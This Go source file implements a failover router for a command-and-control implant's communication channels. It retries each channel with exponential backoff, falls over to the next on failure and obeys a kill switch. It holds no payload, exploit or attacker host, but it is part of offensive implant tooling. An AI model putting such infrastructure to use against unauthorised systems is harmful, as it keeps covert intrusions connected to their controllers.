package transport

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// Router multiplexes a beacon's I/O across an ordered list of
// [Transport] backends, falling over to the next channel when the
// active one fails and applying exponential backoff between
// attempts. The Router itself implements [Transport], so a tier of
// channels can be composed inside another tier (HTTPS-then-DNS
// inside a top-level HTTPS-then-router fallback).
//
// State machine:
//
//  1. Connect probes transports[0]; on failure waits Backoff and
//     retries up to MaxAttempts, then advances to transports[1].
//  2. Read/Write delegate to the active transport. A network error
//     marks the active transport stale; the next Read/Write returns
//     [ErrChannelLost] so the caller can call Connect again to
//     fail over.
//  3. KillSwitch is consulted before every Connect attempt and at
//     each backoff tick. Once it returns true the Router refuses
//     all further reconnects and Close becomes terminal.
//
// The Router holds at most ONE active backend at any time — it is
// a serial fallback, NOT a load balancer. Concurrent Read/Write
// calls on a single Router serialise behind an internal mutex.
type Router struct {
	transports []Transport
	cfg        RouterConfig

	mu        sync.Mutex
	active    Transport
	activeIdx int
	killed    bool
}

// RouterConfig tunes [Router] behaviour. The zero value is
// usable: 1s initial backoff capped at 1m, infinite per-transport
// attempts, no kill switch.
type RouterConfig struct {
	// InitialBackoff is the delay before the FIRST retry on the
	// same transport. Subsequent retries double up to MaxBackoff.
	// Zero defaults to 1s.
	InitialBackoff time.Duration

	// MaxBackoff caps the exponential growth. Zero defaults to
	// 1m. A backoff of 0 (which would be a tight retry loop) is
	// never honoured even if both fields are zero — the defaults
	// fire instead.
	MaxBackoff time.Duration

	// MaxAttempts is the maximum number of Connect tries against a
	// single transport before falling over to the next. Zero means
	// "retry forever on this transport before moving on" — useful
	// when the operator wants the implant to wait out a temporary
	// outage rather than wear out the secondary channel.
	MaxAttempts int

	// KillSwitch, if non-nil, is consulted before each Connect
	// attempt and at each backoff sleep. Returning true makes the
	// Router refuse further connects and surfaces [ErrKilled] from
	// every subsequent operation. Once tripped, the switch can NOT
	// be un-tripped — build a fresh Router instead.
	KillSwitch func() bool
}

// Sentinel errors surfaced at the Router boundary.
var (
	// ErrNoTransports is returned by [NewRouter] when the
	// transports slice is empty or nil.
	ErrNoTransports = errors.New("c2/transport: router needs at least one transport")

	// ErrKilled is surfaced once the kill switch has tripped. All
	// subsequent operations return this; the Router never recovers.
	ErrKilled = errors.New("c2/transport: router kill switch tripped")

	// ErrChannelLost is surfaced from Read/Write after the active
	// transport returned an error. Callers reconnect via
	// [Router.Connect] to pick the next channel.
	ErrChannelLost = errors.New("c2/transport: active channel lost — call Connect to fail over")
)

// NewRouter builds a Router over the supplied transports.
// transports[0] is the preferred channel; later entries are
// fallback tiers tried in order. Returns [ErrNoTransports] when
// the slice is empty.
func NewRouter(transports []Transport, cfg RouterConfig) (*Router, error) {
	if len(transports) == 0 {
		return nil, ErrNoTransports
	}
	if cfg.InitialBackoff <= 0 {
		cfg.InitialBackoff = time.Second
	}
	if cfg.MaxBackoff <= 0 {
		cfg.MaxBackoff = time.Minute
	}
	if cfg.InitialBackoff > cfg.MaxBackoff {
		cfg.MaxBackoff = cfg.InitialBackoff
	}
	return &Router{transports: transports, cfg: cfg}, nil
}

// Connect cycles through the transport list, retrying each with
// exponential backoff up to MaxAttempts before moving on. Returns
// nil on the first successful Connect; [ErrKilled] if the kill
// switch trips; the aggregated error chain from every transport
// otherwise.
//
// The current active transport (if any) is Closed before the new
// connect attempt — Connect is a clean cut-over, not a parallel
// dial.
func (r *Router) Connect(ctx context.Context) error {
	r.mu.Lock()
	if r.killed || (r.cfg.KillSwitch != nil && r.cfg.KillSwitch()) {
		r.killed = true
		r.mu.Unlock()
		return ErrKilled
	}
	if r.active != nil {
		_ = r.active.Close()
		r.active = nil
	}
	start := r.activeIdx
	r.mu.Unlock()

	var errs []error
	for offset := 0; offset < len(r.transports); offset++ {
		idx := (start + offset) % len(r.transports)
		t := r.transports[idx]
		err := r.dialWithBackoff(ctx, t)
		if err == nil {
			r.mu.Lock()
			r.active = t
			r.activeIdx = idx
			r.mu.Unlock()
			return nil
		}
		if errors.Is(err, ErrKilled) || errors.Is(err, context.Canceled) ||
			errors.Is(err, context.DeadlineExceeded) {
			return err
		}
		errs = append(errs, fmt.Errorf("transport[%d]: %w", idx, err))
	}
	return fmt.Errorf("c2/transport: all channels failed: %w", errors.Join(errs...))
}

// dialWithBackoff retries Connect on a single transport with
// exponential backoff. Returns nil on success, [ErrKilled] when
// the switch trips, ctx.Err() on cancellation, or the last error
// after MaxAttempts.
func (r *Router) dialWithBackoff(ctx context.Context, t Transport) error {
	backoff := r.cfg.InitialBackoff
	attempts := 0
	var lastErr error
	for {
		if r.cfg.KillSwitch != nil && r.cfg.KillSwitch() {
			r.mu.Lock()
			r.killed = true
			r.mu.Unlock()
			return ErrKilled
		}
		if err := t.Connect(ctx); err != nil {
			lastErr = err
		} else {
			return nil
		}
		attempts++
		if r.cfg.MaxAttempts > 0 && attempts >= r.cfg.MaxAttempts {
			return lastErr
		}
		timer := time.NewTimer(backoff)
		select {
		case <-ctx.Done():
			timer.Stop()
			return ctx.Err()
		case <-timer.C:
		}
		backoff *= 2
		if backoff > r.cfg.MaxBackoff {
			backoff = r.cfg.MaxBackoff
		}
	}
}

// Read delegates to the active transport. Returns [ErrChannelLost]
// when no transport is active and [ErrKilled] when the switch has
// tripped.
func (r *Router) Read(p []byte) (int, error) {
	t, err := r.currentLocked()
	if err != nil {
		return 0, err
	}
	n, rerr := t.Read(p)
	if rerr != nil && rerr != io.EOF {
		r.markLost(t)
	}
	return n, rerr
}

// Write delegates to the active transport. Same error semantics as
// [Router.Read].
func (r *Router) Write(p []byte) (int, error) {
	t, err := r.currentLocked()
	if err != nil {
		return 0, err
	}
	n, werr := t.Write(p)
	if werr != nil {
		r.markLost(t)
	}
	return n, werr
}

// Close terminates the active transport (if any) and prevents
// further reconnects. Idempotent. Returns the underlying Close
// error from the active transport.
func (r *Router) Close() error {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.killed = true
	if r.active == nil {
		return nil
	}
	t := r.active
	r.active = nil
	return t.Close()
}

// RemoteAddr returns the active transport's RemoteAddr, or nil
// when no transport is connected.
func (r *Router) RemoteAddr() net.Addr {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.active == nil {
		return nil
	}
	return r.active.RemoteAddr()
}

// ActiveIndex returns the index into the original transports
// slice of the currently active channel, or -1 when no transport
// is active. Useful for instrumentation / telemetry.
func (r *Router) ActiveIndex() int {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.active == nil {
		return -1
	}
	return r.activeIdx
}

// currentLocked returns the active transport under the mutex,
// surfacing the appropriate sentinel when none is available.
func (r *Router) currentLocked() (Transport, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.killed {
		return nil, ErrKilled
	}
	if r.active == nil {
		return nil, ErrChannelLost
	}
	return r.active, nil
}

// markLost clears the active transport pointer after a Read/Write
// error. The caller surfaces the original error; subsequent
// Read/Write calls then see [ErrChannelLost] until Connect is
// called.
func (r *Router) markLost(t Transport) {
	r.mu.Lock()
	if r.active != t {
		r.mu.Unlock()
		return
	}
	r.active = nil
	// Advance the start index so the next Connect prefers the
	// channel after the one that just failed. The wrap-around
	// is handled by Connect itself.
	r.activeIdx = (r.activeIdx + 1) % len(r.transports)
	r.mu.Unlock()
	// Close outside the lock: a TLS close_notify on a dying peer can
	// block on FIN, and stalling concurrent Read/Write callers behind
	// the mutex turns a single failed channel into a beacon-wide hang.
	_ = t.Close()
}
